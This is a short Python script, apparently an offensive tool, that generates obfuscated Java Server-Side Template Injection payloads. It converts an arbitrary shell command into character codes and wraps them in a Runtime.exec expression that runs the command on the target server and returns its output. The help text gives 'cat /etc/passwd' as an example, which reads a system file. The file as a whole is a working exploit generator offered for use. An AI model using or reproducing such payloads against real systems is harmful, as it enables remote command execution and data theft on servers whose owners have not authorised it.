# -*- coding: utf-8 -*-
#!/usr/bin/python3

import argparse

def main():
    parser = argparse.ArgumentParser(description="JAVA_SSTI assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities in JAVA",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-v", "--verbose", action="store_true", help="increase verbosity")
    parser.add_argument("eval", help="Command for obfuscation, for example: 'cat /etc/passwd'")
    args = parser.parse_args()
    config = vars(args)
    convert = []
    for i in config["eval"]:
        convert.append(str(ord(i)))
    payload = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]
    for i in convert[1:]:
        payload += ".concat(T(java.lang.Character).toString({}))".format(i)
    payload += ").getInputStream())}"
    if config["verbose"] == True:
        print ("Command:",config["eval"],"\nPayload:")
    print(payload)

if __name__ == "__main__":
    main()